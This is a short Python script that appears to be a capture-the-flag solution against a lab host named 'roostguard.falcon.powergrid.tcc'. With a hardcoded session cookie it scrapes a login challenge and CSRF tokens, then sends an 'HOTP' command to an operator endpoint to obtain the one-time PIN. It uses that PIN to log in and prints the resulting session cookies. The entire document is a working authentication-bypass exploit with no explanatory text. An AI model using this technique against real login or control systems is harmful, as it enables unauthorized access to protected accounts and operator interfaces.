import requests
import base64
import sys

cookies = {
    "session": "J74kySc9yhK37xm95ZoJzyfgPFKNvVgkz7hPD70KC84"
}

r = requests.get("http://roostguard.falcon.powergrid.tcc/login", cookies=cookies)
ch = r.text.split('<span id="login-challenge">')[1].split('</span>')[0]
csrf0 = r.text.split('<meta name="csrf-token" content="')[1].split('"')[0]
print("Challenge:", ch)

r = requests.get("http://roostguard.falcon.powergrid.tcc/operator", cookies=cookies)
csrf = r.text.split('<meta name="csrf-token" content="')[1].split('"')[0]
print("CSRF:", csrf)

headers = {
    "x-Csrftoken": csrf,
}
data = {
    "command": "HOTP" + ch,
}
r = requests.post("http://roostguard.falcon.powergrid.tcc/command", headers=headers, data=data, cookies=cookies)
print(r.text)

pin = input("PIN: ")

data = {
    "password": pin,
    "submit": "Login",
    "csrf_token": csrf0,
}
headers = {
    "x-Csrftoken": csrf0,
}
r = requests.post("http://roostguard.falcon.powergrid.tcc/login", data=data, cookies=cookies, headers=headers)
if "Invalid" in r.text:
    print("Invalid PIN")
    sys.exit()
print(r.cookies)